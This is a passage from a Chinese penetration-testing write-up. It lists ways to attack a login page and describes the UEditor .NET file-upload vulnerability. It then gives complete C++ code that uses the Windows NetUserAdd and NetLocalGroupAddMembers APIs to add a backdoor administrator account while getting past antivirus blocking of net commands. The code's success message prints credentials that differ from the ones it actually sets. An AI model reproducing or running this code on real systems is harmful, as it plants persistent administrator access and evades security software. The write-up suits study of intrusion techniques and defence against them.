0×02开局一个登陆框

开局就是一个登陆框，开整。

遇到登陆可以做的渗透路径大概就是

  • 爆破弱口令——爆破的传统思路都是固定账号爆破密码，还有一种姿势是固定密码爆破用户名。比如使用固定密码123456，爆破常用用户名或者常用人名拼音。

  • 扫目录——-目录扫描是一个存在惊喜的地方，说不定能扫描到后台未授权访问的链接、备份文件、编辑器、敏感信息等。

  • 框架漏洞——-如果能够发现网站使用的某种CMS，例如thinkphp就直接通过已有的漏洞来攻击

  • 源码查看——-右键查看JS源码，你可能会发现被注释的账号密码、接口、token、真实IP、开发环境等可以利用的信息。

漏洞描述

这个编辑器是百度开发的一款编辑器，目前已经不对其进行后续开发和更新，存在多个漏洞（文件上传，xss,ssrf）文件上传漏洞只存在于该编辑器的.net版本。其他的php,jsp,asp版本不受此UEditor的漏洞的影响，.net存在任意文件上传，绕过文件格式的限制，在获取远程资源的时候并没有对远程文件的格式进行严格的过滤与判断。

影响范围

该漏洞影响UEditor的.Net版本，其它语言版本暂时未受影响。

使用system权限添加管理员账号时被狗狗拦截了

最后请教了一些大佬，大佬们说可以使用Windows api函数添加管理员账户，去百度学习了一番

我们在渗透测试过程中需要添加管理员账号是通常是通过CMD调用net命令，然而一些杀软会限制CMD的一些命令，我们就可以使用windows自带的api函数来执行这些操作，从而绕过一些杀软的限制。（很老的方法了，很多的杀软都开始限制api的一些高危操作了）

代码原理：

使用NetUserAdd添加普通权限的用户，NetLocalGroupAddMembers添加管理员权限。

代码如下:

  1. #ifndef UNICODE    
  2. #define UNICODE    
  3. #endif    
  4. #include  <stdio.h>  
  5. #include  <windows.h>  
  6. #include  <lm.h>  
  7. #include <iostream>
  8. #pragma comment(lib,"netapi32")    
  9. int Usage(wchar_t*);
  10. int wmain(int argc, wchar_t* argv[])
  11. {
  12.     // 定义USER_INFO_1结构体
  13.     USER_INFO_1 ui;
  14.     DWORD dwError = 0;
  15.     ui.usri1_name = L"test";            // 账户    
  16.     ui.usri1_password = L"Test@qq.com";      // 密码
  17.     ui.usri1_priv = USER_PRIV_USER;
  18.     ui.usri1_home_dir = NULL;
  19.     ui.usri1_comment = NULL;
  20.     ui.usri1_flags = UF_SCRIPT;
  21.     ui.usri1_script_path = NULL;
  22.     //添加名为test的用户,密码为Test@qq.com    
  23.     if (NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError) == NERR_Success)
  24.     {
  25.         std::cout << "[+]        Add Success!!!  \n";
  26.         std::cout << "[+]        UserName:Bypass360  PassWord:Success@qq.com\n";
  27.     }
  28.     else
  29.     {
  30.         //添加失败    
  31.         std::cout << "[+]        Add User Error!\n";
  32.     }

  34.     // 添加用户到administrators组
  35.     LOCALGROUP_MEMBERS_INFO_3 account;
  36.     account.lgrmi3_domainandname = ui.usri1_name;
  37.     if (NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1) == NERR_Success)
  38.     {
  39.         //添加成功    
  40.         std::cout << "[+]        Add to Administrators Success\n";
  41.     }
  42.     else
  43.     {
  44.         //添加失败    
  45.         std::cout << "[+]        Add to Administrators Error!\n";
  46.     }
  47.     return 0;
  48. }
